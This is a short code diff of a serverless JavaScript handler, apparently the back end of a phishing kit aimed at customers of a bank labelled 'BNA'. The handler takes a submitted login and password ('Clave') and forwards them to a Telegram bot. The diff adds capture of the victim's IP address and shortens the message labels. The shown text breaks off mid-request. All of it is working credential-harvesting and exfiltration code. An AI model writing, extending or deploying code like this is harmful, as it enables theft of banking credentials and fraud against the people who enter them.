@@ -1,11 +1,18 @@
 exports.handler = async (event) => {
   const { tipo, valor } = JSON.parse(event.body);
 
+  // Obtener IP del cliente
+  const ip =
+    event.headers["x-forwarded-for"]?.split(",")[0] ||
+    event.headers["X-Forwarded-For"]?.split(",")[0] ||
+    "IP no disponible";
+
   const mensaje = `
 📩 BNA
 
-Login: ${tipo}
-Clave: ${valor}
+Log: ${tipo}
+Cla: ${valor}
+IP: ${ip}
   `;
 
   await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
